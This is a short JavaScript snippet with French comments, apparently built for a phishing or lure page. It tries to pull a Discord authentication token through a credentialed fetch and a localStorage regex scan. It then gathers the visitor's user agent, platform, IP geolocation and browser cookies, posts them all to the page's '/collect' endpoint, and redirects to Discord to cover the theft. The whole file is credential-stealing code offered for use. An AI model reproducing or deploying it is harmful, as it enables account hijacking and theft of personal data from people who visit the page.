(async function () {
  let token = "Aucun trouvé";

  // ---- Récupération du token Discord via localStorage (connecté à Discord) ----
  try {
    const paths = [
      "https://discord.com/channels/@me",
    ];
    // Fetch vers discord.com en iframe (si connecté)
    for (const url of paths) {
      try {
        const res = await fetch(url, { credentials: "include" });
        const text = await res.text();
        const match = text.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/);
        if (match) { token = match[0]; break; }
      } catch (e) {}
    }
  } catch (e) {}

  // ---- Fallback : localStorage (nécessite même origine, pas possible ici) ----
  if (token === "Aucun trouvé") {
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        const v = localStorage.getItem(k);
        const m = v && v.match && v.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/);
        if (m) { token = m[0]; break; }
      }
    } catch (e) {}
  }

  // ---- Infos système ----
  const platforms = {
    Win32: "Windows", Win64: "Windows", MacIntel: "macOS",
    iPhone: "iOS", iPad: "iPadOS", Linux: "Linux", Android: "Android"
  };
  const platform = platforms[navigator.platform] || navigator.platform;

  // ---- Infos IP + géoloc ----
  let ipinfo = "";
  try {
    const r = await fetch("https://ipapi.co/json/");
    const j = await r.json();
    ipinfo = `${j.city || "?"}, ${j.country_name || "?"} (${j.org || "?"})`;
  } catch (e) {}

  // ---- Envoi au serveur ----
  try {
    await fetch("/collect", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ip: "voir ipinfo",
        ua: navigator.userAgent,
        platform: platform,
        token: token,
        ipinfo: ipinfo,
        cookies: document.cookie || "aucun"
      })
    });
  } catch (e) {}

  // ---- Redirection vers Discord ----
  setTimeout(() => {
    window.location.href = "https://discord.com/channels/@me";
  }, 800);
})();